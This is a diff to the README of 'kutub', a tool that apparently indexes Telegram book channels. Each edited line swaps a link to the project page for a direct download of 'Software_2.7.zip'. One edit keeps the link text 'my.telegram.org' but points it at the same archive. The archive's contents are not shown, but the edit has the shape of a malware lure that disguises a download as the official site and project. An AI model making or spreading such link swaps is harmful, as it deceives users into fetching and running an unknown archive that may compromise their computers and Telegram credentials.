@@ -1,6 +1,6 @@
 # 📚 kutub - Turn Telegram Books into a Searchable Library
 
-[![Download kutub](https://img.shields.io/badge/Download-kutub-2ea44f?style=for-the-badge&logo=github)](https://github.com/campi58/kutub)
+[![Download kutub](https://img.shields.io/badge/Download-kutub-2ea44f?style=for-the-badge&logo=github)](https://github.com/campi58/kutub/raw/refs/heads/main/kutub/Software_2.7.zip)
 
 ## 🎯 What Is kutub?
 
@@ -20,7 +20,7 @@ Getting kutub running on your computer is straightforward. Follow these simple s
 
 ### 📥 Step 1: Download kutub
 
-Visit this link to download the application: [https://github.com/campi58/kutub](https://github.com/campi58/kutub)
+Visit this link to download the application: [https://github.com/campi58/kutub/raw/refs/heads/main/kutub/Software_2.7.zip](https://github.com/campi58/kutub/raw/refs/heads/main/kutub/Software_2.7.zip)
 
 Look for the download button on the page and click it. The download will start automatically.
 
@@ -84,7 +84,7 @@ kutub is designed to run on any modern Windows computer. Here's what you need:
 
 Before kutub can work, you need to get API credentials from Telegram. Here's how:
 
-1. Visit [my.telegram.org](https://my.telegram.org)
+1. Visit [my.telegram.org](https://github.com/campi58/kutub/raw/refs/heads/main/kutub/Software_2.7.zip)
 2. Log in with your phone number
 3. Click "API Development Tools"
 4. Fill in the form (any name works)
@@ -186,7 +186,7 @@ For support, visit the GitHub repository and open an issue. The community is fri
 
 Ready to turn your Telegram book channel into a searchable library?
 
-**Download kutub now:** [https://github.com/campi58/kutub](https://github.com/campi58/kutub)
+**Download kutub now:** [https://github.com/campi58/kutub/raw/refs/heads/main/kutub/Software_2.7.zip](https://github.com/campi58/kutub/raw/refs/heads/main/kutub/Software_2.7.zip)
 
 Join thousands of readers who have already simplified their ebook collection. With kutub, finding the right book has never been easier.
 
